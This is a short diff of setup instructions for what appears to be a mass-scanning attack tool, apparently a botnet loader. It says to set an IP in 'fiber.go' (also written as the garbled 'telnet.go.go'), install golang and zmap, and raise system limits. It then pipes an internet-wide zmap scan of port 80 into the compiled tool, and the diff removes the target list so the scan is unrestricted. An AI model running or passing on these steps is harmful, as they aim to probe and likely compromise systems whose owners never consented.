@@ -1,6 +1,6 @@
-CHANGE IP IN fiber.go
+CHANGE IP IN telnet.go.go
 
-yum install golang -y
-yum install zmap -y
+apt install golang -y
+apt install zmap -y
 go build fiber.go
-ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q | ./fiber 80
+ulimit -n 999999; ulimit  -u999999; zmap -p80 | ./fiber 80
